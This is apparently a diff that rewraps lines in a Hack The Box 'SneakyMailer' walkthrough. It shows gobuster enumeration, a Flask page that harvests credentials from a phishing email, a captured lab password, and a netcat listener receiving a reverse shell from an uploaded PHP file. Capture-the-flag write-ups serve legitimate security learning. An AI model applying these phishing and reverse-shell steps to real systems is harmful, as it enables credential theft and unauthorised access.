@@ -34,7 +34,9 @@ We haven't finished our reconnaissance of the web site yet however and we will r
 
 ```bash
 ┌─[rin@parrot]─[~/boxes/SneakyMailer]
-└──╼ $gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://sneakycorp.htb/
+└──╼ $gobuster dir -t 50 \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+ -u http://sneakycorp.htb/
 …
 /img (Status: 301)
 /css (Status: 301)
@@ -47,7 +49,9 @@ We get a number of directories, the most interesting of which is pypi. We can ru
 
 ```bash
 ┌─[rin@parrot]─[~/boxes/SneakyMailer]
-└──╼ $gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -u http://sneakycorp.htb/pypi/
+└──╼ $gobuster dir -t 50 \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
+ -x .php -u http://sneakycorp.htb/pypi/
 /register.php (Status: 200)
 ```
 
@@ -83,12 +87,13 @@ app = Flask(__name__)
 @app.route('/pypi/register.php',methods=['GET','POST'])
 def register():
  if request.method=="GET":
- return render_template("register.html")
+  return render_template("register.html")
  else:
- print(request.args)
- print(request.form)
- return redirect('http://sneakycorp.htb/pypi/register.php',
- code=302)
+  print(request.args)
+  print(request.form)
+  return redirect('http://sneakycorp.htb/pypi/register.php',
+  code=302)
+
 app.run('0.0.0.0',80)
 ```
 
@@ -146,7 +151,8 @@ As this script runs, it will print out debugging information
  -> From: support@sneakymailer.htb
  -> Subject: Please register your account
  -> Message-Id: <20201215131441.004588@parrot>
- -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+ -> X-Mailer: swaks v20201014.0 
+ ->  jetmore.org/john/code/swaks/
  ->
  -> http://10.10.14.117/pypi/register.php
  ->
@@ -165,13 +171,19 @@ And eventually we will get a hit on the landing page:
 [sudo] password for rin:
  * Serving Flask app "app" (lazy loading)
  * Environment: production
- WARNING: This is a development server. Do not use it in a production deployment.
+ WARNING: This is a development server. Do not use it in 
+ a production deployment.
  Use a production WSGI server instead.
  * Debug mode: off
  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
 ImmutableMultiDict([])
-ImmutableMultiDict([('firstName', 'Paul'), ('lastName', 'Byrd'), ('email', 'paulbyrd@sneakymailer.htb'), ('password', '^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht'), ('rpassword', '^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht')])
-10.129.2.28 - - [15/Dec/2020 13:15:06] "POST /pypi/register.php HTTP/1.1" 302 -
+ImmutableMultiDict([('firstName', 'Paul'), 
+('lastName', 'Byrd'), ('email', 
+'paulbyrd@sneakymailer.htb'), 
+('password', '^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht'), 
+('rpassword', '^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht')])
+10.129.2.28 - - [15/Dec/2020 13:15:06] 
+ "POST /pypi/register.php HTTP/1.1" 302 -
 ```
 
 The user Paul Byrd with email address **paulbyrd@sneakymailer.htb** and password **^\(\#J@SkFv2\[%KhIxKk\(Ju\`hqcHl&lt;:Ht** responded to the phishing email.
@@ -235,7 +247,9 @@ We can try writing to the directory by using a put command. It turns out that we
 
 ```bash
 ┌─[✗]─[oztechmuse@parrot]─[~/boxes/SneakyMailer/]
-└──╼ $gobuster vhost -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u sneakycorp.htb
+└──╼ $gobuster vhost -t 50 \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
+ -u sneakycorp.htb
 <SNIP>
 ===============================================================
 Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
@@ -260,7 +274,8 @@ Calling the file from [http://dev.sneakycorp.htb/revshell.php](http://dev.sneaky
 └──╼ $nc -lvnp 6001
 listening on [any] 6001 ...
 connect to [10.10.14.117] from (UNKNOWN) [10.129.2.28] 45354
-Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
+Linux sneakymailer 4.19.0-9-amd64 
+#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
  08:01:00 up 10:35, 0 users, load average: 0.00, 0.02, 0.00
 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
